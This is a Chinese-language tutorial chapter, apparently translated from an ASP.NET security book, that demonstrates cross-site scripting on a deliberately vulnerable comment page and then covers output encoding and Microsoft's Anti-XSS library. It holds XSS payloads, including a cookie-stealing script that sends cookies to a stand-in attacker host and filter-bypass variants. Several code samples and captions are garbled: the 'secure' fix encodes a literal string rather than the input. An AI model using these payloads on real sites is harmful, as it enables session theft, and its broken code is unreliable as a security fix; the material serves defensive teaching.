
# Demonstrating Cross Site Scripting

```html
<title>Demonstrating Cross Site Scripting</title>

</head>

<body>

<form id="form" runat="server">

<div>

<asp:Panel ID="commentPrompt" runat="server">

What is your comment?

<asp:TextBox ID="commentInput" runat="server" TextMode="MultiLine" /> <br />

<asp:Button ID="submit" runat="server" Text="Submit" />

</asp:Panel>

<asp:Panel ID="commentDisplay" runat="server"

Visible="false">

Comment:

<asp:Literal ID="commentOutput" runat="server" />

</asp:Panel>

</div>

</form>

</body>

</html>
```

该页面通过以下代码接受输入并在 `commentOutput` 控件中显示它：

```csharp
using System;

public partial class _Default : System.Web.UI.Page
{
    protected void Page_Load(object sender, EventArgs e)
    {
        Response.Cookies["authentication"].Value = "hello";
        if (IsPostBack)
        {
            commentDisplay.Visible = true;
            commentPrompt.Visible = false;
            commentOutput.Text = Request["commentInput"];
        }
        else
        {
            commentDisplay.Visible = false;
            commentPrompt.Visible = true;
        }
    }
}
```

默认情况下，ASP.NET 提供了一些基础保护。创建并运行示例页面并输入注释 `hello`。你将看到抛出一个异常：从客户端检测到潜在的危险请求（A potentially dangerous Request detected from the client）。但是，有时你希望用户可以使用输入字段，因此你必须关闭验证。

通过将页面上的 `validation` 属性设置为 `false`，可以关闭特定页面的请求验证，如下：

```asp
<%@ Page Language="C#" AutoEventWire="true"
CodeFile="Default.aspx" Inherits="_Default" ValidateRequest="false" %>
```

另一种方法是通过编辑 `web.config` 并在 `pages` 部分设置 `validateRequest` 属性来全站禁用请求验证，如下所示：

```xml
<configuration>
  <system.web>
    <pages validateRequest="false" />
  </system.web>
</configuration>
```

不建议禁用请求验证。应该按页面应用验证。如果添加了新页面或你忘记了特定页面上的输入验证，验证将无法为你提供保护。这很重要，因为你一一禁用请求验证，就可能引入 XSS 漏洞。

### 3. 修改示例页面以请求验证，如下所示：

```asp
@Page Language="C#" AutoEventWire="true"
ValidateRequest="false"
CodeFile="Default.aspx" Inherits="Default" %>
```

### 4. 现在，输入注释 `<script>window.alert('Hello XSS');</script>`。当你点击提交时，将像图 3-2 所示显示对话框。

![](img/74212f18de7bcb_771_0.png)

图 3-2：简单的 XSS 攻击示例

如你所示，注入 JavaScript 命令导致 JavaScript 代码被包含在页面输出中并返回浏览器。当然，显示警框并不意味着存在漏洞，除非警框包含恶意文本。

### 5. 除非警框包含恶意文本，否则通过点击 OK 消除对话框，返回首页并输入 `<script>location.href='http://google.com';</script>`。点击提交后，浏览器将重定向到 www.google.com。如果指向一个尝试安装间谍软件的网站，攻击将变得更严重。

![](img/74212f18de7bcb_71.png)

示例页面创建了“authentication” cookie，可能会被 XSS 窃取。为了简单起见，此示例使用警框显示 cookie。然而，攻击者也可以通过注入以下 JavaScript 代码将信息发送到另一个网站：

```javascript
<script>document.write('<img src="http://myacksite.example/cookies.aspx?cookie='+ 
```

该脚本将从攻击者的网站加载一个隐藏图像（高度和宽度为零），并将 cookie 附加到请求中。攻击者随后可以检查服务器日志来检索 cookie，或者存储 cookie 的页面。

## 安全地处理输入

> 警告：请记住这不仅仅是表单漏洞。你输出到页面的任何输入都可能创建 XSS 漏洞。JavaScript 可以通过字符串、cookie 甚至 HTTP Header 发送。

## 工作原理

XSS 之所以泛滥是因为大多数网站使用动态内容。动态内容是一个通用术语，但本质上涵盖了任何允许交互或程序输出的网页。任何处理输入的动态网站都可能存在漏洞。之前的示例只是 XSS 能实现的一小部分。

依赖 ASP.NET 的请求验证是不够的，因为在许多合法情况下必须禁用请求验证。微软建议将 ASP.NET 的请求验证视为您自己验证的额外预防措施。微软还表示“不要依赖请求验证”。像任何软件一样，NET 框架可能包含漏洞。安全公告 `MS07-040` 为绕过请求验证的编码技巧提供了修复。详情可以在常见漏洞网站 `http://cve.mitre.org` 下的 `CVE-2007-0042`。

## 缓解 XSS

XSS 的缓解技术如下：开发者必须检查并限制所有输入（无论是来自用户、XML 文件或其他源），并对其输出进行编码。对于请求验证，你有责任在写入页面之前对其进行编码。

输出编码包括取输入字符串、对字符串中的每个字符进行编码，并将字符从一种格式转换为另一种格式。例如，取字符串 `hello` 并转换为适用于 HTML 输出的格式（HTML 编码），将把 `<` 替换为 `&lt;`，并产生安全的输出 `&lt;hello&gt;`。

> 注意：XSS 备忘表网站 `http://ha.ckers.org/xss.html` 提供了大量可能的组合和方法，用于让 XSS 攻击绕过过滤器。

任何你生成输出的页面——通过 `Response.Write`、`%@` 或通过设置在页面内产生文本的控件属性——都应该仔细检查。.NET 框架在 `System.Web` 命名空间中为你提供了编码功能，即 `HttpUtility.HtmlEncode` 和 `HttpUtility.UrlEncode`。使用这些函数，你可以转义不安全字符以保存为安全值。`HtmlEncode` 对作为 HTML 页面的输出进行编码。`UrlEncode` 转义输出值，使其用于 URL（如锚点标签的 `href` 属性）。

## 尝试：使示例网页安全

通过更改设置 `commentOutput.Text` 属性的代码以使用 `HttpUtility.HtmlEncode`，你可以使示例页面安全，如下代码所示：

```csharp
using System;
using System.Web;
public partial class _Default : System.Web.UI.Page
{
    protected void Page_Load(object sender, EventArgs e)
    {
        Response.Cookies["authentication"].Value = "helloWrox";
        if (this.IsPostBack)
        {
            this.commentDisplay.Visible = true;
            this.commentPrompt.Visible = false;
            this.commentOutput.Text =
                HttpUtility.HtmlEncode("commentInput*");
        }
        else
        {
            this.commentDisplay.Visible = false;
            this.commentPrompt.Visible = true;
        }
    }
}
```

某些 ASP.NET 控件会自动为你对属性进行编码，但某些则不会。表 3 显示了需要编码的常用控件和属性。

### 表 3-1：需要 HTML 编码的常用 ASP.Net 控件属性

| 控件 | 属性 |
| --- | --- |
| System.Web.UI.Page | Title |
| System.Web.UI.WebControls.CheckBox | Text |
| System.Web.UI.Controls.CompareValidator | Text |
| System.Web.UI.Controls.CustomValidator | Text |
| System.Web.UI.Controls.DropDownList | Text |
| System.Web.UI.Controls.HyperLink | Text |
| System.Web.UI.Controls.Label | Text |
| System.Web.UI.Controls.LinkButton | Text |
| System.Web.UI.Controls.ListBox | Text |
| System.Web.UI.Controls.ListControl | Text |
| System.Web.UI.Controls.Literal | Text |
| System.Web.UI.Controls.RadioButton | Text |
| System.Web.UI.Controls.RadioButtonList | Text |
| System.Web.UI.Controls.RangeValidator | Text |
| System.Web.UI.Controls.RegularExpressionValidator | Text |
| System.Web.UI.Controls.RequiredFieldValidator | Text |

源自：`http://blogs.msdn.com/cisg/archive/2008/09/17/which-asp-net-controls-html-encoding.aspx`

ASP.NET 控件的完整列表、其属性以及可能需要的编码可以从 `http://blogs.msdn.com/sfaust/attachment/8918996.ashx` 下载。

> 警告：不只是用户输入应该被视为不安全并进行编码。任何来自你完全控制的系统的输入都带有被破坏的风险。例如，如果你从数据库中检索了用于页面输出的文本，那么该文本也应该被编码，除非它来自你可以信任的地方。

## Microsoft AntXSS 库

Microsoft 提供了一个免费的 Ant-XSS 库。该库扩展了内置的编码方法，并为 HTML 属性、JavaScript、XML 等提供了额外的输出类型。每种输出类型（或上下文）的编码规则都是不同的，取决于你为内容选择合适的输出上下文。Anti-XSS 库采用白名单方法，在十多种语言中定义了有效字符列表列表。（将此方法与黑名单方法进行比较，后者会定义无效字符、代码和命令列表。）由于 Anti-XSS 库包含了比框架内置更新、更健壮的 `HtmlEncode` 和 `UrlEncode` 函数，你应该使用 Anti-XSS 版本。

> 注意：你可以从 `http://www.codeplex.com/antix` 下载源代码 Anti-XSS 库。如果你不想检查代码并自行编译，codeplex 站点还包含二进制文件下载的链接。

表 3-2 显示了 Anti-XSS 库不支持的编码。

| 编码 | 用法 |
|---||---|
| HtmlEncode | 当不可信的输入赋值给 HTML 输出时使用，除非它被赋值给 HTML 属性。 |
| HtmlAttributeEncode | 当不可信的输入赋值给 HTML 属性（如 id, name, width 或 height）时使用。 |
| JavaScriptEncode | 当不可信的输入在 JavaScript 中使用时。 |
| UrlEncode | 当不可信的输入用于生成（或用于 URL 内）时。 |
| VisualBasicScriptEncode | 当不可信的输入在 VBScript 中使用时。 |
| XmlEncode | 当不可信的输入赋值给 XML 输出时使用，除非它被赋值给 XML 属性。 |
| XmlAttributeEncode | 当不可信的输入赋值给 XML 属性时。 |

### 表 3-2：Microsoft Anti-XSS 库支持的编码

## 安全运行时

Anti-XSS 库还包含安全运行时（SRE）和 HTTP 模块，它们通过使用 XSS 库自动编码数据来保护你的 ASP.NET 应用程序。SRE 包含一个名为 SRE 配置生成器的实用程序，如图 3-4 所示。

```csharp
// 创建一个包含
// 编码输入的构建器。
StringBuilder htmlBuilder = 
new StringBuilder(
  (HtpUtility.HtmlEncode(
    (commentInput.Text))));

// 现在选择性地重命名
// 我们想要支持的 HTML
htmlBuilder.Replace("&lt;&gt;", "<b>");
htmlBuilder.Replace("&lt;/gt;", "</b>");
htmlBuilder.Replace("&lt;i &gt;", "<i>");
htmlBuilder.Replace("&lt;/i &gt;", "</i>");
```

```csharp
// 最后在我们的页面中使用
// 新限制的字符串。
this.commentOutput.Text =
htmlBuilder.toString();
```

```csharp
}
else {
  this.commentDisplay.Visible = false;
  this.commentPrompt.Visible = true;
}
```

2. 现在，运行调整后的 Web 页面，并输入 `<i>Hello</i><b>world</b>` 作为示例说明。你将发现，你受限的输入支持*斜体*和**粗体**格式，并且编码了文本中嵌入任何其他 `<` 和 `&` 字符。

通过限制输入并对输出进行编码以限制支持的标签，你可以在不增加网站风险的情况下支持某些功能。随着你允许的 HTML 标签数量增加，无意中引入 XSS 漏洞的风险也会增加。以下标签经常用于 XSS 攻击：

- `<applet>`
- `<body>`
- `<embed>`
- `<frame>`
- `<frameset>`
- `<html>`
- `<frame>`
- `<layer>`
- `<img>`
- `<layer>`

```
<link>
<meta>
<object>
<script>
<style>
```

除了 HTML 标签外，某些 HTML 属性也可以用于 XSS 攻击。例如，如果你决定支持 img 标签，可以使用 `src` 属性注入代码——例如，`<img src="javascript:window.alert('Hello XSS');" />`。

解决此问题的明显方法是清理输入中的 `javascript` 并将其移除。如果你使用不安全字符串列表进行查找，可能会产生一个禁用值的黑名单。然而，正如 XSS 备忘表网站之前提到的，以下示例将绕过对该 `javascript` 关键字的简单检查：

```
<img src="java&x00;script:window.alert('Hello XSS');" />
<img src="java&x01;script:window.alert('Hello XSS');" />
```

这些有效的原理是通过在 JavaScript 命令中编码换行符，许多浏览器会将其移除并放置。HTML 标签还包含如 `OnClick` 或 `OnMouseOver` 等事件，也可以用于包含和运行脚本。

> 永远不要依赖通过黑名单或过滤不需要的值来清理输入。这很容易被绕过。相反，请使用白名单方法，允许已知的安全值。

# 第 3 章：安全地接受用户输入
